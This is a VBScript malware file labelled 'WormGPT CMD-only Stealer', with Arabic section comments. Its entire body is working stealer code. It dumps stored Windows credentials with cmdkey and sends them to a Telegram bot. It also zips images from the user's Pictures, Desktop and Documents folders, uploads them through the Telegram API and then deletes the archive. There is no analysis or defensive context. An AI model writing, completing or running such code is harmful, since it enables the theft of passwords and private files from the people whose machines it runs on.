' WormGPT CMD-only Stealer – no PowerShell, pure VBS
Option Explicit

Const BOT_TOKEN = ""
Const CHAT_ID = ""

' ===== إرسال رسالة نصية =====
Sub SendMsg(text)
    Dim http, url, data
    url = "https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage"
    data = "chat_id=" & CHAT_ID & "&text=" & URLEncode(text)
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "POST", url, False
    http.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.Send data
End Sub

' ===== إرسال ملف =====
Sub SendFile(filePath, caption)
    Dim http, boundary, stream, content, part
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binary
    stream.Open
    stream.LoadFromFile filePath
    content = stream.Read
    stream.Close

    boundary = "---------------------------" & Right("00000000" & Hex(Rnd * 2147483647), 8)
    Dim data
    data = "--" & boundary & vbCrLf
    data = data & "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & CHAT_ID & vbCrLf
    data = data & "--" & boundary & vbCrLf
    data = data & "Content-Disposition: form-data; name=""document""; filename=""" & GetFileName(filePath) & """" & vbCrLf
    data = data & "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
    data = data & content & vbCrLf
    data = data & "--" & boundary & "--"

    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "POST", "https://api.telegram.org/bot" & BOT_TOKEN & "/sendDocument", False
    http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    http.Send data
End Sub

Function GetFileName(path)
    Dim arr : arr = Split(path, "\")
    GetFileName = arr(UBound(arr))
End Function

Function URLEncode(str)
    Dim i, ch, res : res = ""
    For i = 1 To Len(str)
        ch = Mid(str, i, 1)
        If (Asc(ch) >= 48 And Asc(ch) <= 57) Or (Asc(ch) >= 65 And Asc(ch) <= 90) Or (Asc(ch) >= 97 And Asc(ch) <= 122) Or ch = "." Or ch = "-" Or ch = "_" Or ch = "~" Then
            res = res & ch
        Else
            res = res & "%" & Hex(Asc(ch))
        End If
    Next
    URLEncode = res
End Function

' ===== سرقة كلمات المرور =====
Sub StealCredentials()
    Dim shell, exec, output, lines, cred, line, target
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd /c cmdkey /list")
    output = exec.StdOut.ReadAll
    lines = Split(output, vbCrLf)
    cred = ""
    For Each line In lines
        If InStr(line, "Target:") Then
            target = Trim(Replace(line, "Target:", ""))
            If target <> "" Then
                Set exec2 = shell.Exec("cmd /c cmdkey /show:" & target)
                cred = cred & "=== " & target & " ===" & vbCrLf & exec2.StdOut.ReadAll & vbCrLf
            End If
        End If
    Next
    If cred <> "" Then
        SendMsg "🧨 Stored Passwords:" & vbCrLf & cred
    Else
        SendMsg "📭 No credentials found."
    End If
End Sub

' ===== جمع الصور =====
Sub StealImages()
    Dim fso, shell, tempDir, zipFile, folders, ext, count, file, fExt, user
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("Shell.Application")
    tempDir = fso.GetSpecialFolder(2) & "\"
    zipFile = tempDir & "images.zip"

    ' إنشاء ملف ZIP فارغ
    Dim ts : Set ts = fso.CreateTextFile(zipFile, True)
    ts.Write "PK" & Chr(5) & Chr(6) & String(18, 0)
    ts.Close

    user = shell.ExpandEnvironmentStrings("%USERNAME%")
    folders = Array("Pictures", "Desktop", "Documents")
    ext = Array(".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff")
    count = 0

    For Each folderName In folders
        Dim path : path = "C:\Users\" & user & "\" & folderName
        If fso.FolderExists(path) Then
            For Each file In fso.GetFolder(path).Files
                fExt = LCase(fso.GetExtensionName(file.Path))
                For Each e In ext
                    If "." & fExt = e Then
                        shell.NameSpace(zipFile).CopyHere file.Path, 16
                        count = count + 1
                        Exit For
                    End If
                Next
            Next
        End If
    Next

    If count > 0 Then
        SendFile zipFile, "📸 " & count & " images stolen."
    Else
        SendMsg "📭 No images found."
    End If

    On Error Resume Next
    fso.DeleteFile zipFile, True
    On Error GoTo 0
End Sub

' ===== تنفيذ =====
StealCredentials()
StealImages()
